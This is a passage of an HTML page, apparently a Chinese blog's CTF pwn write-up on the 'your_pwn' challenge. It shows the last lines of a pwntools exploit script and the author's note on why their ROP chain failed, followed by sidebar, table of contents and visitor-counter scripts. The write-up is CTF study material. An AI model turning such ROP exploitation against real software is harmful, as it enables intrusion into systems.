class="string">'28'</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'yes\n'</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>被卡很久的原因就是在一开始输入名字的时候我随便填了一个很长的字符串，而这个字符串刚好在我放置rop链的地方，并且构造rop链时偷懒，没有覆盖全8个字节，所以字符串的高字节部分没有被覆盖为0，导致rop失败。。。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/14/fastbin-attack/" rel="next" title="fastbin attack">
+                <i class="fa fa-chevron-left"></i> fastbin attack
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Muirelle</p>
+              <p class="site-description motion-element" itemprop="description">吾将上下而求索</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#your-pwn"><span class="nav-number">1.</span> <span class="nav-text">your_pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#流程分析"><span class="nav-number">1.1.</span> <span class="nav-text">流程分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路历程"><span class="nav-number">1.2.</span> <span class="nav-text">思路历程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#index-value"><span class="nav-number">1.2.1.</span> <span class="nav-text">index_value</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#leak-ret"><span class="nav-number">1.2.2.</span> <span class="nav-text">leak_ret</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#布置rop链"><span class="nav-number">1.2.3.</span> <span class="nav-text">布置rop链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#loop"><span class="nav-number">1.2.4.</span> <span class="nav-text">loop</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exploit"><span class="nav-number">1.3.</span> <span class="nav-text">完整exploit</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Muirelle</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("K1WEvzezolboN84rQYlF0Dvv-gzGzoHsz", "KnwfedBiA348tAxLpapkotlB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
